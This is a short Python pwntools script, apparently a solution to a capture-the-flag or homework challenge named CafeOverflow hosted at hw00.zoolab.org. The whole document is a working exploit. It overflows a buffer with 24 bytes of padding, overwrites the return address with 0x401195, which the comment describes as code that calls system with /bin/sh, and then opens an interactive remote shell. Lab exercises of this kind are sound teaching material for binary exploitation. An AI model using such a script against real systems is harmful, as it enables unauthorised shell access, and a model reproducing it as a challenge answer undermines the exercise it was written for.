#!/usr/bin/env python3
from pwn import *

context(arch='amd64', terminal=['tmux', 'neww'])
r = remote('hw00.zoolab.org', 65534)
#r = process('./CafeOverflow')

payload = cyclic(24)
payload += p64(0x401195)  # push /bin/sh; call system in func1

r.sendline(payload)
r.interactive()
